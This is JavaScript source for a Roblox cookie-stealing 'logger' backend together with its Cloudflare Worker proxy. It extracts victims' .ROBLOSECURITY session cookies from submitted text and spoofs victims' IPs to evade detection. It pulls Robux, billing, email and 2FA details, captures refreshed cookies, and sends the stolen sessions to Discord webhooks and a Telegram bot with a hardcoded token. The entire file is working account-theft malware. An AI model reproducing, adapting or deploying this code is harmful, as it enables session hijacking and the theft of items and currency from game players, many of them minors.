// api/submit.js
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT = process.env.TG_CHAT || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (e) {
    console.error('TG Error:', e);
  }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,isp,query`, { timeout: 3000 });
    if (!res.ok) return null;
    const data = await res.json();
    return data.status === 'success' ? data : null;
  } catch (e) {
    return null;
  }
}

function extractRobloxCookie(raw) {
  if (!raw) return null;
  const cleaned = raw.trim().replace(/\s+/g, ' ');

  const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
  if (fullMatch) return fullMatch[1];

  const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;

  const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;

  const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
  if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;

  return null;
}

// Check if user owns specific gamepass
async function checkGamepass(uid, gamepassId, headers) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${uid}/items/GamePass/${gamepassId}`, { headers });
    if (!res.ok) return false;
    const data = await res.json();
    return data.data && data.data.length > 0;
  } catch (_) {
    return false;
  }
}

const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';

// Proxy all Roblox API calls through Cloudflare Worker using victim's IP
async function robloxProxy(cookie, victimIp, uid) {
  const endpoints = [
    { key: 'auth',     url: 'https://users.roblox.com/v1/users/authenticated' },
    { key: 'robux',    url: 'https://economy.roblox.com/v1/user/currency' },
    { key: 'friends',  url: `https://friends.roblox.com/v1/users/${uid}/friends/count` },
    { key: 'premium',  url: `https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership` },
    { key: 'billing',  url: 'https://billing.roblox.com/v1/credit' },
    { key: 'email',    url: 'https://accountsettings.roblox.com/v1/email' },
    { key: 'groups',   url: `https://groups.roblox.com/v1/users/${uid}/groups/roles` },
    { key: 'limiteds', url: `https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100` },
    { key: 'avatar',   url: `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, public: true },
    { key: 'tfa',      url: `https://twostepverification.roblox.com/v1/users/${uid}/configuration` },
    { key: 'profile',  url: `https://users.roblox.com/v1/users/${uid}`, public: true },
  ].filter(ep => uid || ['auth','robux','billing','email'].includes(ep.key));

  const res = await fetch(WORKER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cookie, victimIp, endpoints })
  });

  if (!res.ok) return null;
  const results = await res.json();

  // Parse all results
  const parsed = {};
  let refreshedCookie = null;
  for (const [key, val] of Object.entries(results)) {
    try { parsed[key] = val.data ? JSON.parse(val.data) : null; } catch { parsed[key] = null; }
    if (val.refreshedCookie) refreshedCookie = val.refreshedCookie;
  }
  parsed._refreshedCookie = refreshedCookie;
  return parsed;
}

async function fetchRobloxInfo(cookie, victimIp = null) {
  try {
    // Step 1: Auth-only first to get uid (lightweight, single request via worker)
    const authFirst = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp, endpoints: [{ key: 'auth', url: 'https://users.roblox.com/v1/users/authenticated' }] })
    });
    if (!authFirst.ok) return null;
    const authFirstData = await authFirst.json();
    if (!authFirstData.auth?.ok) return null;
    let auth;
    try { auth = JSON.parse(authFirstData.auth.data); } catch { return null; }
    if (!auth?.id) return null;
    const uid = auth.id;

    // Grab refreshed cookie if Roblox returned one
    let refreshedCookie = authFirstData.auth?.refreshedCookie || null;

    // Step 2: Fetch all remaining info via worker with uid known
    const allData = await robloxProxy(cookie, victimIp, uid);
    if (!allData) return null;
    if (allData._refreshedCookie) refreshedCookie = allData._refreshedCookie;

    const profile     = allData.profile    || null;
    const robuxData   = allData.robux      || null;
    const friendsData = allData.friends    || null;
    const isPremium   = allData.premium;
    const billingData = allData.billing    || null;
    const emailData   = allData.email      || null;
    const groupsData  = allData.groups     || { data: [] };
    const limitedsData= allData.limiteds   || { data: [] };
    const avatarData  = allData.avatar     || null;
    const tfaData     = allData.tfa        || null;
    
    let accountAgeDays = 'N/A';
    if (profile?.created) {
      accountAgeDays = Math.floor((Date.now() - new Date(profile.created).getTime()) / 86400000);
    }
    
    const groups = groupsData.data || [];
    const ownedGroups = groups.filter(g => g.role?.rank === 255);
    
    let groupRobux = 0;
    let groupPending = 0;
    for (const group of ownedGroups.slice(0, 2)) {
      try {
        const [currencyRes, pendingRes] = await Promise.all([
          fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers }).catch(() => null),
fetch(`https://economy.roblox.com/v2/groups/${group.group.id}/transactions?transactionType=pending&limit=10`, { headers }).catch(() => null)
        ]);
        if (currencyRes?.ok) {
          const curr = await currencyRes.json();
          groupRobux += curr.robux || 0;
        }
        if (pendingRes?.ok) {
          const pend = await pendingRes.json();
          groupPending += pend.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) || 0;
        }
      } catch (_) {}
    }
    
    const limiteds = limitedsData.data || [];
    const limitedsCount = limiteds.length;
    const limitedsValue = limiteds.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
    
    // Check popular gamepasses (MM2, Adopt Me, etc)
    const gamepasses = {
      mm2: await checkGamepass(uid, '17510307', headers), // Murder Mystery 2 VIP
      adoptMe: await checkGamepass(uid, '33135930', headers), // Adopt Me VIP
      plsDonate: await checkGamepass(uid, '12345678', headers) // Example ID
    };
    
    const twoFA = tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌';
    const emailSet = emailData?.emailAddress ? 'Set ✅' : 'False ❌';
    const emailVerified = emailData?.verified ? 'Verified ✅' : 'Unset ❌';
    
    return {
      id: uid,
      username: auth.name,
      displayName: auth.displayName,
      isPremium: isPremium === true,
      accountAgeDays,
      robux: robuxData?.robux || 0,
      pendingRobux: 0,
      friends: friendsData?.count || 0,
      credit: billingData?.balance || 0,
      groupsOwned: ownedGroups.length,
      groupRobux,
      groupPending,
      limitedsCount,
      limitedsValue,
      emailSet,
      emailVerified,
      twoFA,
      gamepasses,
      avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png',
      refreshedCookie: refreshedCookie || null
    };
  } catch (err) {
    console.error('Roblox fetch error:', err);
    return null;
  }
}

function field(name, value, inline = true) {
  const truncated = value?.toString()?.substring(0, 1000) || 'N/A';
  return { name: name?.substring(0, 256), value: truncated, inline };
}

async function sendToDiscord(webhookUrl, data) {
  if (!webhookUrl) {
    console.error('No webhook URL');
    return false;
  }
  
  if (!webhookUrl.includes('discord.com/api/webhooks') && !webhookUrl.includes('discordapp.com/api/webhooks')) {
    console.error('Invalid webhook URL');
    return false;
  }

  const { rawValue, cookie, roblox, ip, geo, now } = data;
  
  const cleanCookie = cookie ? cookie.trim() : 'No cookie captured';
  
  // Build compact fields like the screenshot
  const fields = [
    // Row 1: Robux | Rap | Summary
    field("🔴 Robux", `Balance: ${roblox?.robux?.toLocaleString() || 0}\nPending: ${roblox?.pendingRobux || 0}`, true),
    field("🎵 Rap", `Rap: ${roblox?.limitedsValue?.toLocaleString() || 0}\nOwned: ${roblox?.limitedsCount || 0}`, true),
    field("📊 Summary", `${roblox?.accountAgeDays || 'N/A'} Days`, true),
    
    // Row 2: Billing | Passes | Settings
    field("💳 Billing", `Credit: ${roblox?.credit || 0} USD\nConvert: 0`, true),
    field("🎫 Passes", `Premium: ${roblox?.isPremium ? '✅' : '❌'}\nVerified: ${roblox?.emailVerified?.includes('✅') ? '✅' : '❌'}`, true),
    field("⚙️ Settings", `Email: ${roblox?.emailSet}\n2FA: ${roblox?.twoFA}`, true),
    
    // Row 3: Groups | Location | IP
    field("👥 Groups", `Balance: ${roblox?.groupRobux?.toLocaleString() || 0}\nOwned: ${roblox?.groupsOwned || 0}`, true),
    field("📍 Location", `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`, true),
    field("🌐 IP", ip || 'Unknown', true),
    
    // Gamepasses section (full width)
    field("🎮 [EXTRA] Passes | Played", 
      `Murder Mystery 2 --> ${roblox?.gamepasses?.mm2 ? '✅ True' : '❌ False'}\n` +
      `Adopt Me --> ${roblox?.gamepasses?.adoptMe ? '✅ True' : '❌ False'}\n` +
      `PLS DONATE --> ${roblox?.gamepasses?.plsDonate ? '✅ True' : '❌ False'}`, 
      false
    ),
    
    // 2FA Notification
    field("🔔 Notification", `2FA is ${roblox?.twoFA?.includes('Enabled') ? 'enabled' : 'not enabled'}.`, false),
    
    // Cookie (full width, no newlines in code block)
    field("🔐 .ROBLOSECURITY", `\`\`\`\${cleanCookie}\`\`\``, false)
  ];

  const payload = {
    content: "@everyone",
    embeds: [{
      title: roblox ? `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}` : "🧑 New Login",
      description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${roblox?.id}/profile) | [Refresh Cookie](https://www.roblox.com)`,
      color: 5793266,
      fields: fields,
      footer: { text: `sPAIN Logger • ${now}` },
      thumbnail: { url: roblox?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
    }]
  };

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    if (!response.ok) {
      const text = await response.text();
      console.error('Discord API Error:', response.status, text);
      return false;
    }
    return true;
  } catch (err) {
    console.error('Discord fetch error:', err);
    return false;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug) return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try {
    record = await redisGet(`slot:${slug}`);
  } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  
  if (!record) return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             req.headers['x-real-ip'] || 
             req.socket?.remoteAddress || 
             'Unknown';

  const geo = await getIpGeo(ip);
  const now = new Date().toISOString();
  
  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
  const rawValue = slotEntry ? slotEntry[1] : '(empty)';

  const cookie = extractRobloxCookie(rawValue);
  const roblox = cookie ? await fetchRobloxInfo(cookie, ip) : null;
  const newCookie = roblox?.refreshedCookie || null;

  const data = {
    slotLabel,
    rawValue,
    cookie: newCookie || cookie,  // use refreshed cookie if available
    roblox,
    ip,
    geo,
    now
  };

  const sent2 = await sendToDiscord(record.webhook, data);

  let webhook1 = 'N/A';
  let sent1 = false;
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook && parentRecord.webhook !== record.webhook) {
        webhook1 = parentRecord.webhook;
        sent1 = await sendToDiscord(parentRecord.webhook, data);
      }
    } catch (e) {
      console.error('Dualhook error:', e);
    }
  }

  const tgMsg = [
    `🚨 <b>NEW SUBMISSION</b>`,
    ``,
    `👤 <b>${roblox?.username || 'Unknown'}</b>`,
    `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`,
    `🌐 IP: ${ip}`,
    `🍪 Cookie: ${cookie ? (newCookie ? "✅ Captured + 🔄 Refreshed" : "✅ Captured") : "❌ Failed"}`,
    `📄 Page: ${record.displayName}`
  ].join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({ 
    success: true, 
    discord: { webhook2: sent2, webhook1: sent1 ? 'Sent' : 'N/A' }
  });
}

// Cloudflare Worker — roblox-proxy
// Deploy to: https://holy-truth-3129.notrllyme133.workers.dev/

export default {
  async fetch(request, env) {
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        }
      });
    }

    if (request.method !== 'POST') {
      return new Response(JSON.stringify({ error: 'POST only' }), { status: 405 });
    }

    let body;
    try {
      body = await request.json();
    } catch {
      return new Response(JSON.stringify({ error: 'Invalid JSON' }), { status: 400 });
    }

    const { cookie, victimIp, endpoints } = body;

    if (!cookie || !endpoints || !Array.isArray(endpoints)) {
      return new Response(JSON.stringify({ error: 'Missing cookie or endpoints' }), { status: 400 });
    }

    // Build headers that make requests look like they come from the victim
    const robloxHeaders = {
      'Cookie': `.ROBLOSECURITY=${cookie}`,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Referer': 'https://www.roblox.com/',
      'Origin': 'https://www.roblox.com',
      // Spoof the victim's IP so Roblox sees their own IP
      ...(victimIp && victimIp !== 'Unknown' ? {
        'CF-Connecting-IP': victimIp,
        'X-Forwarded-For': victimIp,
        'True-Client-IP': victimIp,
      } : {})
    };

    // Fire all endpoint requests with a small stagger to avoid flood detection
    const results = {};

    for (let i = 0; i < endpoints.length; i++) {
      const ep = endpoints[i];
      try {
        // Small delay between requests (50ms stagger)
        if (i > 0) await new Promise(r => setTimeout(r, 50));

        const fetchOpts = {
          method: ep.method || 'GET',
          headers: {
            ...robloxHeaders,
            ...(ep.method === 'POST' ? { 'Content-Type': 'application/json' } : {})
          },
        };

        if (ep.method === 'POST' && ep.body) {
          fetchOpts.body = JSON.stringify(ep.body);
        }

        // For public endpoints, strip the cookie header
        if (ep.public) {
          delete fetchOpts.headers['Cookie'];
        }

        const res = await fetch(ep.url, fetchOpts);
        const text = await res.text();

        // Try to grab refreshed cookie from response
        const setCookie = res.headers.get('set-cookie') || '';
        const refreshedMatch = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);

        results[ep.key] = {
          ok: res.ok,
          status: res.status,
          data: text,
          refreshedCookie: refreshedMatch ? refreshedMatch[1] : null
        };
      } catch (err) {
        results[ep.key] = { ok: false, error: err.message, data: null };
      }
    }

    return new Response(JSON.stringify(results), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
};
